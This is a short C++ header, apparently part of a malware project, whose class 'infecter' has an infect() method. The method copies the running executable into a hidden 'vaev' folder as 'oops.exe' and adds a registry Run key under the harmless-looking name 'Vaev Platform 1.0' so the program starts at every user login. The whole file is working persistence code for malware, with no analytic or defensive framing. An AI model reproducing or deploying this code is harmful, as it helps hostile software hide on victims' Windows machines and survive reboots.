#pragma once

#include <Windows.h>
#include <iostream>

namespace vaev
{
	class infecter
	{
	public:
		bool infect()
		{
			HKEY key;

			CreateDirectoryA("vaev/", 0);
			SetFileAttributesA("vaev/", FILE_ATTRIBUTE_HIDDEN);

			char* FileName;
			char NewPath[MAX_PATH];
			GetFullPathNameA("vaev/", MAX_PATH, NewPath, &FileName);
			

			char Path[MAX_PATH];
			GetModuleFileNameA(NULL, Path, MAX_PATH);
			
			char FullNewPath[MAX_PATH];
			sprintf(FullNewPath, "%soops.exe", NewPath);
			CopyFileA(Path, FullNewPath, false);

			RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &key);
			RegSetValueExA(key, "Vaev Platform 1.0", 0, REG_SZ, (BYTE*)FullNewPath, sizeof(FullNewPath));

			return true;
		}
	};
}